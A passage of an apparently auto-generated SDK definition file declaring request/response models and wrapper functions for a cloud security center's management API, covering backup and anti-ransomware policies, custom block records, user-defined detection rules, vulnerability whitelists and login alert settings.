  statusCode: int32(name='statusCode'),
  body: ModifyAutoDelConfigResponseBody(name='body'),
}

async function modifyAutoDelConfigWithOptions(request: ModifyAutoDelConfigRequest, runtime: Util.RuntimeOptions): ModifyAutoDelConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.days)) {
    query['Days'] = request.days;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyAutoDelConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyAutoDelConfig(request: ModifyAutoDelConfigRequest): ModifyAutoDelConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyAutoDelConfigWithOptions(request, runtime);
}

model ModifyBackupPolicyRequest {
  id?: long(name='Id'),
  name?: string(name='Name'),
  policy?: map[string]any(name='Policy'),
  policyRegionId?: string(name='PolicyRegionId'),
  policyVersion?: string(name='PolicyVersion'),
  uuidList?: [ string ](name='UuidList'),
}

model ModifyBackupPolicyShrinkRequest {
  id?: long(name='Id'),
  name?: string(name='Name'),
  policyShrink?: string(name='Policy'),
  policyRegionId?: string(name='PolicyRegionId'),
  policyVersion?: string(name='PolicyVersion'),
  uuidList?: [ string ](name='UuidList'),
}

model ModifyBackupPolicyResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyBackupPolicyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyBackupPolicyResponseBody(name='body'),
}

async function modifyBackupPolicyWithOptions(tmpReq: ModifyBackupPolicyRequest, runtime: Util.RuntimeOptions): ModifyBackupPolicyResponse {
  Util.validateModel(tmpReq);
  var request = new ModifyBackupPolicyShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.policy)) {
    request.policyShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.policy, 'Policy', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.policyShrink)) {
    query['Policy'] = request.policyShrink;
  }
  if (!Util.isUnset(request.policyRegionId)) {
    query['PolicyRegionId'] = request.policyRegionId;
  }
  if (!Util.isUnset(request.policyVersion)) {
    query['PolicyVersion'] = request.policyVersion;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyBackupPolicy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyBackupPolicy(request: ModifyBackupPolicyRequest): ModifyBackupPolicyResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyBackupPolicyWithOptions(request, runtime);
}

model ModifyBackupPolicyStatusRequest {
  id?: long(name='Id', description='The ID of the anti-ransomware policy.', example='30490'),
  policyVersion?: string(name='PolicyVersion', description='The version of the anti-ransomware policy. Set the value to **2.0.0**.', example='2.0.0'),
  status?: string(name='Status', description='Specifies whether to enable or disable the anti-ransomware policy. Valid values:

*   **enabled**: enables the anti-ransomware policy. After you enable the anti-ransomware policy, the anti-ransomware feature protects data on your servers. Data on your servers is backed up based on the policy.
*   **disabled**: disables the anti-ransomware policy. After you disable the anti-ransomware policy, the data backup task that is running based on the policy stops.

>  When the system runs data backup tasks, your network bandwidth is consumed. We recommend that you enable the anti-ransomware policy during peak-off hours to back up data.', example='enabled'),
}

model ModifyBackupPolicyStatusResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='E342452B-4401-5F74-9A1B-D24479851173'),
}

model ModifyBackupPolicyStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyBackupPolicyStatusResponseBody(name='body'),
}

async function modifyBackupPolicyStatusWithOptions(request: ModifyBackupPolicyStatusRequest, runtime: Util.RuntimeOptions): ModifyBackupPolicyStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.policyVersion)) {
    query['PolicyVersion'] = request.policyVersion;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyBackupPolicyStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyBackupPolicyStatus(request: ModifyBackupPolicyStatusRequest): ModifyBackupPolicyStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyBackupPolicyStatusWithOptions(request, runtime);
}

model ModifyClearLogstoreStorageRequest {
  from?: string(name='From'),
  lang?: string(name='Lang'),
  userLogStore?: string(name='UserLogStore'),
  userProject?: string(name='UserProject'),
}

model ModifyClearLogstoreStorageResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyClearLogstoreStorageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyClearLogstoreStorageResponseBody(name='body'),
}

async function modifyClearLogstoreStorageWithOptions(request: ModifyClearLogstoreStorageRequest, runtime: Util.RuntimeOptions): ModifyClearLogstoreStorageResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.userLogStore)) {
    query['UserLogStore'] = request.userLogStore;
  }
  if (!Util.isUnset(request.userProject)) {
    query['UserProject'] = request.userProject;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyClearLogstoreStorage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyClearLogstoreStorage(request: ModifyClearLogstoreStorageRequest): ModifyClearLogstoreStorageResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyClearLogstoreStorageWithOptions(request, runtime);
}

model ModifyClientConfSetupRequest {
  strategyConfig?: string(name='StrategyConfig', example='{
      "cpu": "20"
}'),
  strategyTag?: string(name='StrategyTag', example='machineResource'),
  strategyTagValue?: string(name='StrategyTagValue', example='major'),
}

model ModifyClientConfSetupResponseBody = {
  requestId?: string(name='RequestId', example='60E24426-B910-5D7F-8B8B-3BCDC3FC****'),
}

model ModifyClientConfSetupResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyClientConfSetupResponseBody(name='body'),
}

async function modifyClientConfSetupWithOptions(request: ModifyClientConfSetupRequest, runtime: Util.RuntimeOptions): ModifyClientConfSetupResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.strategyConfig)) {
    query['StrategyConfig'] = request.strategyConfig;
  }
  if (!Util.isUnset(request.strategyTag)) {
    query['StrategyTag'] = request.strategyTag;
  }
  if (!Util.isUnset(request.strategyTagValue)) {
    query['StrategyTagValue'] = request.strategyTagValue;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyClientConfSetup',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyClientConfSetup(request: ModifyClientConfSetupRequest): ModifyClientConfSetupResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyClientConfSetupWithOptions(request, runtime);
}

model ModifyClientConfStrategyRequest {
  tag?: string(name='Tag', example='machineResource'),
  tagExt?: string(name='TagExt', example='auto'),
  tagValue?: string(name='TagValue', example='advanced'),
  uuid?: string(name='Uuid', example='4fe8e1cd-3c37-4851-b9de-124da32c****'),
  uuids?: [ string ](name='Uuids'),
}

model ModifyClientConfStrategyResponseBody = {
  requestId?: string(name='RequestId', example='9089D0AB-835F-5663-AB5E-4FF646BB****'),
}

model ModifyClientConfStrategyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyClientConfStrategyResponseBody(name='body'),
}

async function modifyClientConfStrategyWithOptions(request: ModifyClientConfStrategyRequest, runtime: Util.RuntimeOptions): ModifyClientConfStrategyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.tag)) {
    query['Tag'] = request.tag;
  }
  if (!Util.isUnset(request.tagExt)) {
    query['TagExt'] = request.tagExt;
  }
  if (!Util.isUnset(request.tagValue)) {
    query['TagValue'] = request.tagValue;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyClientConfStrategy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyClientConfStrategy(request: ModifyClientConfStrategyRequest): ModifyClientConfStrategyResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyClientConfStrategyWithOptions(request, runtime);
}

model ModifyClientUserDefineRuleRequest {
  actionType?: int32(name='ActionType', example='0'),
  cmdline?: string(name='Cmdline', example='/usr/sbin/s****'),
  filePath?: string(name='FilePath', example='/etc/pam.d/su****'),
  IP?: string(name='IP', example='1.1.XX.XX'),
  id?: long(name='Id', example='210****'),
  md5List?: string(name='Md5List', example='aa5ee3ed4363c9d195a591a70281****,3e522d6f3bf5cf88bb77e9ff3d13****'),
  name?: string(name='Name'),
  newFilePath?: string(name='NewFilePath', example='/etc/pam****'),
  parentCmdline?: string(name='ParentCmdline', example='/usr/sbin/s****'),
  parentProcPath?: string(name='ParentProcPath', example='C:/Windows/System32/cmd****'),
  platform?: string(name='Platform', example='linux'),
  port?: int32(name='Port', example='22'),
  portStr?: string(name='PortStr', example='80'),
  procPath?: string(name='ProcPath', example='/root/1111/****'),
  registryContent?: string(name='RegistryContent', example='SECOH-QAD****'),
  registryKey?: string(name='RegistryKey', example='HKEY_DYN_****'),
  type?: int32(name='Type', example='2'),
}

model ModifyClientUserDefineRuleResponseBody = {
  requestId?: string(name='RequestId', example='5cbb3c39-88ec-429a-be26-5d0f62cc****'),
}

model ModifyClientUserDefineRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyClientUserDefineRuleResponseBody(name='body'),
}

async function modifyClientUserDefineRuleWithOptions(request: ModifyClientUserDefineRuleRequest, runtime: Util.RuntimeOptions): ModifyClientUserDefineRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.actionType)) {
    query['ActionType'] = request.actionType;
  }
  if (!Util.isUnset(request.cmdline)) {
    query['Cmdline'] = request.cmdline;
  }
  if (!Util.isUnset(request.filePath)) {
    query['FilePath'] = request.filePath;
  }
  if (!Util.isUnset(request.IP)) {
    query['IP'] = request.IP;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.md5List)) {
    query['Md5List'] = request.md5List;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.newFilePath)) {
    query['NewFilePath'] = request.newFilePath;
  }
  if (!Util.isUnset(request.parentCmdline)) {
    query['ParentCmdline'] = request.parentCmdline;
  }
  if (!Util.isUnset(request.parentProcPath)) {
    query['ParentProcPath'] = request.parentProcPath;
  }
  if (!Util.isUnset(request.platform)) {
    query['Platform'] = request.platform;
  }
  if (!Util.isUnset(request.port)) {
    query['Port'] = request.port;
  }
  if (!Util.isUnset(request.portStr)) {
    query['PortStr'] = request.portStr;
  }
  if (!Util.isUnset(request.procPath)) {
    query['ProcPath'] = request.procPath;
  }
  if (!Util.isUnset(request.registryContent)) {
    query['RegistryContent'] = request.registryContent;
  }
  if (!Util.isUnset(request.registryKey)) {
    query['RegistryKey'] = request.registryKey;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyClientUserDefineRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyClientUserDefineRule(request: ModifyClientUserDefineRuleRequest): ModifyClientUserDefineRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyClientUserDefineRuleWithOptions(request, runtime);
}

model ModifyConcernNecessityRequest {
  concernNecessity?: string(name='ConcernNecessity', example='asap,nntf'),
}

model ModifyConcernNecessityResponseBody = {
  requestId?: string(name='RequestId', example='F059E190-A65B-5DF8-8709-2CC7791A5B65'),
}

model ModifyConcernNecessityResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyConcernNecessityResponseBody(name='body'),
}

async function modifyConcernNecessityWithOptions(request: ModifyConcernNecessityRequest, runtime: Util.RuntimeOptions): ModifyConcernNecessityResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.concernNecessity)) {
    query['ConcernNecessity'] = request.concernNecessity;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyConcernNecessity',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyConcernNecessity(request: ModifyConcernNecessityRequest): ModifyConcernNecessityResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyConcernNecessityWithOptions(request, runtime);
}

model ModifyCreateVulWhitelistRequest {
  reason?: string(name='Reason'),
  targetInfo?: string(name='TargetInfo'),
  whitelist?: string(name='Whitelist'),
}

model ModifyCreateVulWhitelistResponseBody = {
  requestId?: string(name='RequestId'),
  vulWhitelistList?: [ 
    {
      id?: long(name='Id'),
    }
  ](name='VulWhitelistList'),
}

model ModifyCreateVulWhitelistResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyCreateVulWhitelistResponseBody(name='body'),
}

async function modifyCreateVulWhitelistWithOptions(request: ModifyCreateVulWhitelistRequest, runtime: Util.RuntimeOptions): ModifyCreateVulWhitelistResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.reason)) {
    query['Reason'] = request.reason;
  }
  if (!Util.isUnset(request.targetInfo)) {
    query['TargetInfo'] = request.targetInfo;
  }
  if (!Util.isUnset(request.whitelist)) {
    query['Whitelist'] = request.whitelist;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyCreateVulWhitelist',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyCreateVulWhitelist(request: ModifyCreateVulWhitelistRequest): ModifyCreateVulWhitelistResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyCreateVulWhitelistWithOptions(request, runtime);
}

model ModifyCustomBlockRecordRequest {
  blockIp?: string(name='BlockIp', example='10.12.XX.XX'),
  bound?: string(name='Bound', example='out'),
  expireTime?: long(name='ExpireTime', example='1940899881000'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  uuids?: string(name='Uuids', example='2516fe4f-adb6-45d1-87a7-90ce1213****,30746836-68d0-47f6-8b2d-c93150da****,7c3ac531-077b-46b8-8706-5c8d4e73****'),
}

model ModifyCustomBlockRecordResponseBody = {
  requestId?: string(name='RequestId', example='A4EE4B1F-CEF8-5A75-86D3-D012CB3D****'),
}

model ModifyCustomBlockRecordResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyCustomBlockRecordResponseBody(name='body'),
}

async function modifyCustomBlockRecordWithOptions(request: ModifyCustomBlockRecordRequest, runtime: Util.RuntimeOptions): ModifyCustomBlockRecordResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.blockIp)) {
    query['BlockIp'] = request.blockIp;
  }
  if (!Util.isUnset(request.bound)) {
    query['Bound'] = request.bound;
  }
  if (!Util.isUnset(request.expireTime)) {
    query['ExpireTime'] = request.expireTime;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyCustomBlockRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyCustomBlockRecord(request: ModifyCustomBlockRecordRequest): ModifyCustomBlockRecordResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyCustomBlockRecordWithOptions(request, runtime);
}

model ModifyCycleTaskRequest {
  configId?: string(name='ConfigId'),
  enable?: int32(name='Enable'),
  firstDateStr?: long(name='FirstDateStr'),
  intervalPeriod?: int32(name='IntervalPeriod'),
  param?: string(name='Param'),
  periodUnit?: string(name='PeriodUnit'),
  targetEndTime?: int32(name='TargetEndTime'),
  targetStartTime?: int32(name='TargetStartTime'),
  taskName?: string(name='TaskName'),
  taskType?: string(name='TaskType'),
}

model ModifyCycleTaskResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyCycleTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyCycleTaskResponseBody(name='body'),
}

async function modifyCycleTaskWithOptions(request: ModifyCycleTaskRequest, runtime: Util.RuntimeOptions): ModifyCycleTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.configId)) {
    query['ConfigId'] = request.configId;
  }
  if (!Util.isUnset(request.enable)) {
    query['Enable'] = request.enable;
  }
  if (!Util.isUnset(request.firstDateStr)) {
    query['FirstDateStr'] = request.firstDateStr;
  }
  if (!Util.isUnset(request.intervalPeriod)) {
    query['IntervalPeriod'] = request.intervalPeriod;
  }
  if (!Util.isUnset(request.param)) {
    query['Param'] = request.param;
  }
  if (!Util.isUnset(request.periodUnit)) {
    query['PeriodUnit'] = request.periodUnit;
  }
  if (!Util.isUnset(request.targetEndTime)) {
    query['TargetEndTime'] = request.targetEndTime;
  }
  if (!Util.isUnset(request.targetStartTime)) {
    query['TargetStartTime'] = request.targetStartTime;
  }
  if (!Util.isUnset(request.taskName)) {
    query['TaskName'] = request.taskName;
  }
  if (!Util.isUnset(request.taskType)) {
    query['TaskType'] = request.taskType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyCycleTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyCycleTask(request: ModifyCycleTaskRequest): ModifyCycleTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyCycleTaskWithOptions(request, runtime);
}

model ModifyEmgVulSubmitRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  name?: string(name='Name', description='The name of the vulnerability.', example='scan:ASCV-2019-032401'),
  userAgreement?: string(name='UserAgreement', description='Specifies whether to scan for urgent vulnerabilities. Valid values:

*   **yes**
*   **no**', example='yes'),
}

model ModifyEmgVulSubmitResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='52A3AEE6-114A-499D-8990-4BA9B27FE0AA'),
}

model ModifyEmgVulSubmitResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyEmgVulSubmitResponseBody(name='body'),
}

async function modifyEmgVulSubmitWithOptions(request: ModifyEmgVulSubmitRequest, runtime: Util.RuntimeOptions): ModifyEmgVulSubmitResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.userAgreement)) {
    query['UserAgreement'] = request.userAgreement;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyEmgVulSubmit',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyEmgVulSubmit(request: ModifyEmgVulSubmitRequest): ModifyEmgVulSubmitResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyEmgVulSubmitWithOptions(request, runtime);
}

model ModifyGroupPropertyRequest {
  data?: string(name='Data'),
}

model ModifyGroupPropertyResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyGroupPropertyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyGroupPropertyResponseBody(name='body'),
}

async function modifyGroupPropertyWithOptions(request: ModifyGroupPropertyRequest, runtime: Util.RuntimeOptions): ModifyGroupPropertyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.data)) {
    query['Data'] = request.data;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyGroupProperty',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyGroupProperty(request: ModifyGroupPropertyRequest): ModifyGroupPropertyResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyGroupPropertyWithOptions(request, runtime);
}

model ModifyInstanceAntiBruteForceRuleRequest {
  newRuleId?: long(name='NewRuleId', description='The ID of the defense rule.', example='65767'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
  uuid?: string(name='Uuid', description='The UUID of the server for which you want to modify the defense rule. You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='7cc91747-2845-40d4-bb69-c077597f****'),
}

model ModifyInstanceAntiBruteForceRuleResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4BE468CE-47A0-54F0-98A1-E253546E6A2C'),
}

model ModifyInstanceAntiBruteForceRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyInstanceAntiBruteForceRuleResponseBody(name='body'),
}

async function modifyInstanceAntiBruteForceRuleWithOptions(request: ModifyInstanceAntiBruteForceRuleRequest, runtime: Util.RuntimeOptions): ModifyInstanceAntiBruteForceRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.newRuleId)) {
    query['NewRuleId'] = request.newRuleId;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyInstanceAntiBruteForceRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyInstanceAntiBruteForceRule(request: ModifyInstanceAntiBruteForceRuleRequest): ModifyInstanceAntiBruteForceRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyInstanceAntiBruteForceRuleWithOptions(request, runtime);
}

model ModifyLogMetaStatusRequest {
  from?: string(name='From', example='sas'),
  logStore?: string(name='LogStore', example='aegis-log-login'),
  project?: string(name='Project', example='aegis-log'),
  status?: string(name='Status', example='disabled'),
}

model ModifyLogMetaStatusResponseBody = {
  requestId?: string(name='RequestId', example='861445A7-B6D6-5825-B015-CD46ED90613A'),
}

model ModifyLogMetaStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyLogMetaStatusResponseBody(name='body'),
}

async function modifyLogMetaStatusWithOptions(request: ModifyLogMetaStatusRequest, runtime: Util.RuntimeOptions): ModifyLogMetaStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.logStore)) {
    query['LogStore'] = request.logStore;
  }
  if (!Util.isUnset(request.project)) {
    query['Project'] = request.project;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyLogMetaStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyLogMetaStatus(request: ModifyLogMetaStatusRequest): ModifyLogMetaStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyLogMetaStatusWithOptions(request, runtime);
}

model ModifyLoginBaseConfigRequest {
  config?: string(name='Config'),
  target?: string(name='Target'),
  type?: string(name='Type'),
}

model ModifyLoginBaseConfigResponseBody = {
  code?: string(name='Code'),
  message?: string(name='Message'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model ModifyLoginBaseConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyLoginBaseConfigResponseBody(name='body'),
}

async function modifyLoginBaseConfigWithOptions(request: ModifyLoginBaseConfigRequest, runtime: Util.RuntimeOptions): ModifyLoginBaseConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.target)) {
    query['Target'] = request.target;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyLoginBaseConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyLoginBaseConfig(request: ModifyLoginBaseConfigRequest): ModifyLoginBaseConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyLoginBaseConfigWithOptions(request, runtime);
}

model ModifyLoginSwitchConfigRequest {
  item?: string(name='Item', description='The type of the alert that you want to enable or disable. Valid values:

*   **login\\_common_ip**: alerts for unapproved logon IP addresses
*   **login\\_common_time**: alerts for unapproved logon time ranges
*   **login\\_common_account**: alerts for unapproved logon accounts', example='login_common_account'),
  status?: int32(name='Status', description='Specifies whether to enable the logon security settings. Valid values:

*   **0**: disables the logon security settings
*   **1**: enables the logon security settings', example='0'),
}

model ModifyLoginSwitchConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='B256A525-7E42-4BB9-A27C-9017FDDFF1A2'),
}

model ModifyLoginSwitchConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyLoginSwitchConfigResponseBody(name='body'),
}

async function modifyLoginSwitchConfigWithOptions(request: ModifyLoginSwitchConfigRequest, runtime: Util.RuntimeOptions): ModifyLoginSwitchConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.item)) {
    query['Item'] = request.item;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyLoginSwitchConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
